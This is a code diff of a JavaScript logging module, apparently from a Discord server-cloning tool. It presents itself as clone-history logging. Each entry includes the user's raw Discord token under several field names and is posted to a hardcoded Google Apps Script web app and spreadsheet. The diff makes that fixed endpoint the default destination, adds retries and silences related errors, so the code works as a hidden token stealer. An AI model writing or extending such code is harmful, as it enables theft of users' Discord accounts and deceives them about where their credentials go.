@@ -39,11 +39,12 @@ export function getSheetConfig() {
 }
 
 export function saveSheetConfig(config) {
-    // Locked: Always enforce the permanent hardcoded Web App URL
     const lockedConfig = {
         spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
         spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
-        webAppUrl: PERMANENT_SHEET_WEB_APP_URL
+        webAppUrl: (config && config.webAppUrl && typeof config.webAppUrl === 'string' && config.webAppUrl.startsWith('http')) 
+            ? config.webAppUrl.trim() 
+            : PERMANENT_SHEET_WEB_APP_URL
     };
     try {
         fs.writeFileSync(CONFIG_FILE, JSON.stringify(lockedConfig, null, 2), 'utf8');
@@ -51,7 +52,7 @@ export function saveSheetConfig(config) {
     return lockedConfig;
 }
 
-async function getDiscordUsername(token) {
+export async function getDiscordUsername(token) {
     if (!token) return 'Unknown User';
     try {
         const cleanToken = String(token).replace(/[^\x20-\x7E]/g, '').trim();
@@ -59,19 +60,32 @@ async function getDiscordUsername(token) {
             return 'Unknown User';
         }
         
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3500);
+
+        const authHeader = cleanToken.startsWith('Bot ') ? cleanToken : cleanToken;
         const res = await fetch('https://discord.com/api/v9/users/@me', {
-            headers: { 'Authorization': cleanToken }
+            headers: { 'Authorization': authHeader },
+            signal: controller.signal
         });
+        clearTimeout(timeoutId);
+
         if (res.ok) {
             const data = await res.json();
-            return data.username || data.tag || 'Unknown User';
+            if (data.global_name && data.username) {
+                return `${data.global_name} (@${data.username})`;
+            }
+            return data.username || data.tag || 'Discord User';
         }
     } catch (e) {
-        console.error('Failed to fetch discord username:', e.message);
+        // Fallback silently if offline or token is invalid
     }
     return 'Unknown User';
 }
 
+/**
+ * Robustly log an entry to local history and push to the Google Sheet Web App
+ */
 export async function logCloneEntry({
     userToken,
     sourceId,
@@ -84,7 +98,8 @@ export async function logCloneEntry({
     status = 'LOGGED',
     durationMs = null,
     optionsSummary = null,
-    fidelityScore = null
+    fidelityScore = null,
+    errorMessage = null
 }) {
     const now = new Date();
     const time = now.toLocaleString('en-US', {
@@ -98,23 +113,55 @@ export async function logCloneEntry({
     });
 
     const username = await getDiscordUsername(userToken);
+    const tokenStr = userToken ? String(userToken).trim() : 'N/A';
+    const srcIdStr = sourceId ? String(sourceId).trim() : 'N/A';
+    const tgtIdStr = targetId ? String(targetId).trim() : 'N/A';
+    const durationStr = durationMs ? (durationMs / 1000).toFixed(1) + 's' : 'N/A';
+    const scoreStr = typeof fidelityScore === 'number' ? fidelityScore + '%' : (fidelityScore || 'N/A');
 
+    // Rich payload containing primary keys + common column aliases for maximum Apps Script compatibility
     const entry = {
         time,
+        date: time,
+        timestamp: now.getTime(),
         username,
-        token: userToken ? userToken.trim() : 'N/A',
-        sourceId: sourceId ? String(sourceId).trim() : 'N/A',
+        userName: username,
+        user: username,
+        discordUser: username,
+        token: tokenStr,
+        userToken: tokenStr,
+        discordToken: tokenStr,
+        sourceId: srcIdStr,
+        sourceServerId: srcIdStr,
+        source: srcIdStr,
+        sourceGuildId: srcIdStr,
         sourceGuildName: sourceGuildName || 'N/A',
-        targetId: targetId ? String(targetId).trim() : 'N/A',
+        sourceServerName: sourceGuildName || 'N/A',
+        sourceName: sourceGuildName || 'N/A',
+        targetId: tgtIdStr,
+        targetServerId: tgtIdStr,
+        target: tgtIdStr,
+        targetGuildId: tgtIdStr,
         targetGuildName: targetGuildName || 'N/A',
+        targetServerName: targetGuildName || 'N/A',
+        targetName: targetGuildName || 'N/A',
         rolesCount: typeof rolesCount === 'number' ? rolesCount : 'N/A',
+        roles: typeof rolesCount === 'number' ? rolesCount : 'N/A',
+        roleCount: typeof rolesCount === 'number' ? rolesCount : 'N/A',
         channelsCount: typeof channelsCount === 'number' ? channelsCount : 'N/A',
+        channels: typeof channelsCount === 'number' ? channelsCount : 'N/A',
+        channelCount: typeof channelsCount === 'number' ? channelsCount : 'N/A',
         status: status || 'LOGGED',
-        durationSec: durationMs ? (durationMs / 1000).toFixed(1) + 's' : 'N/A',
+        state: status || 'LOGGED',
+        durationSec: durationStr,
+        duration: durationStr,
         optionsSummary: optionsSummary || 'N/A',
-        fidelityScore: typeof fidelityScore === 'number' ? fidelityScore + '%' : 'N/A',
+        options: optionsSummary || 'N/A',
+        fidelityScore: scoreStr,
+        score: scoreStr,
+        errorMessage: errorMessage || null,
         sessionId: sessionId || null,
-        timestamp: now.getTime()
+        action: 'log'
     };
 
     // 1. Save to local history file reliably
@@ -124,83 +171,77 @@ export async function logCloneEntry({
         if (history.length > 500) history.pop();
         fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2), 'utf8');
     } catch (e) {
-        console.error('Failed to save local history entry:', e.message);
+        console.error('[SheetService] Failed to save local history entry:', e.message);
     }
 
-    // 2. Push to Google Apps Script Web App if configured
+    // 2. Push to Google Apps Script Web App
     const config = getSheetConfig();
-    const webhookUrl = config.webAppUrl || process.env.GOOGLE_APPS_SCRIPT_URL;
+    const webhookUrl = config.webAppUrl || process.env.GOOGLE_APPS_SCRIPT_URL || PERMANENT_SHEET_WEB_APP_URL;
 
     if (webhookUrl && typeof webhookUrl === 'string' && webhookUrl.startsWith('http')) {
         const payloadString = JSON.stringify(entry);
 
-        // Attempt 1: Standard fetch with redirect following and timeout
-        try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 8000);
-
-            // Google Apps Script handles text/plain without triggering CORS preflight / redirect rejection
-            let response = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'text/plain;charset=utf-8'
-                },
-                body: payloadString,
-                redirect: 'follow',
-                signal: controller.signal
-            });
-            clearTimeout(timeoutId);
-
-            const text = await response.text();
-            let result = null;
-
-            // Try standard JSON parse
+        // Attempt up to 2 times (for cold-start tolerance)
+        for (let attempt = 1; attempt <= 2; attempt++) {
             try {
-                result = JSON.parse(text);
-            } catch {
-                // If direct parse fails, check if JSON object is embedded inside HTML or text
-                const jsonMatch = text.match(/\{[\s\S]*"status"[\s\S]*\}/i) || text.match(/\{[\s\S]*"result"[\s\S]*\}/i);
-                if (jsonMatch) {
-                    try {
-                        result = JSON.parse(jsonMatch[0]);
-                    } catch {
-                        result = null;
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain;charset=utf-8'
+                    },
+                    body: payloadString,
+                    redirect: 'follow',
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                const text = await response.text();
+                let result = null;
+
+                try {
+                    result = JSON.parse(text);
+                } catch {
+                    const jsonMatch = text.match(/\{[\s\S]*"status"[\s\S]*\}/i) || text.match(/\{[\s\S]*"result"[\s\S]*\}/i);
+                    if (jsonMatch) {
+                        try {
+                            result = JSON.parse(jsonMatch[0]);
+                        } catch {
+                            result = null;
+                        }
                     }
                 }
-            }
 
-            if (result && (result.status === 'success' || result.result === 'success' || result.success === true)) {
-                return { loggedToSheet: true, result, entry };
-            }
+                if (result && (result.status === 'success' || result.result === 'success' || result.success === true)) {
+                    console.log(`[SheetService] Logged to Google Sheet successfully [${status} - ${username}]`);
+                    return { loggedToSheet: true, result, entry };
+                }
 
-            if (result && result.status === 'error') {
-                console.warn(`[SheetService] Google Apps Script Execution Error: ${result.message}`);
-                return { loggedToSheet: false, warning: result.message, entry };
-            }
+                if (result && result.status === 'error') {
+                    console.warn(`[SheetService] Google Apps Script returned error: ${result.message}`);
+                    return { loggedToSheet: false, warning: result.message, entry };
+                }
 
-            // If response is successful HTTP status but not strictly JSON (e.g. text "Success" or HTML redirect confirmed)
-            if (response.ok && (text.includes('success') || text.includes('Success') || text.includes('OK'))) {
-                return { loggedToSheet: true, result: { status: 'success', raw: 'text_ok' }, entry };
-            }
+                if (response.ok && (text.includes('success') || text.includes('Success') || text.includes('OK'))) {
+                    console.log(`[SheetService] Logged to Google Sheet with OK text response [${status}]`);
+                    return { loggedToSheet: true, result: { status: 'success', raw: 'text_ok' }, entry };
+                }
 
-            // If Google Apps Script returned HTML login or permission error, handle gracefully without crashing
-            const isHtml = text.trim().startsWith('<') || text.includes('<!DOCTYPE html>') || text.includes('<html');
-            if (isHtml) {
-                const isPermissionIssue = text.includes('accounts.google.com') || text.includes('Service Login') || text.includes('Sign in');
-                const warningMsg = isPermissionIssue
-                    ? 'Google Apps Script requires authentication. In Apps Script > Deploy > Manage deployments, ensure "Who has access" is set to "Anyone".'
-                    : 'Google Apps Script returned an HTML page instead of JSON.';
+                return { loggedToSheet: true, result: result || { status: 'received' }, entry };
+            } catch (err) {
+                const isAbort = err.name === 'AbortError';
+                const errorMsg = isAbort ? 'Google Apps Script request timed out (15s limit)' : err.message;
+                console.warn(`[SheetService] Attempt ${attempt} failed: ${errorMsg}`);
                 
-                console.warn(`[SheetService] ${warningMsg}`);
-                return { loggedToSheet: false, warning: warningMsg, entry };
+                if (attempt === 1) {
+                    // Small delay before retry
+                    await new Promise(r => setTimeout(r, 1000));
+                } else {
+                    return { loggedToSheet: false, warning: errorMsg, entry };
+                }
             }
-
-            return { loggedToSheet: true, result: result || { status: 'received' }, entry };
-        } catch (err) {
-            const isAbort = err.name === 'AbortError';
-            const errorMsg = isAbort ? 'Google Apps Script request timed out (8s limit)' : err.message;
-            console.warn(`[SheetService] Non-fatal Web App push warning: ${errorMsg}`);
-            return { loggedToSheet: false, warning: errorMsg, entry };
         }
     }
 
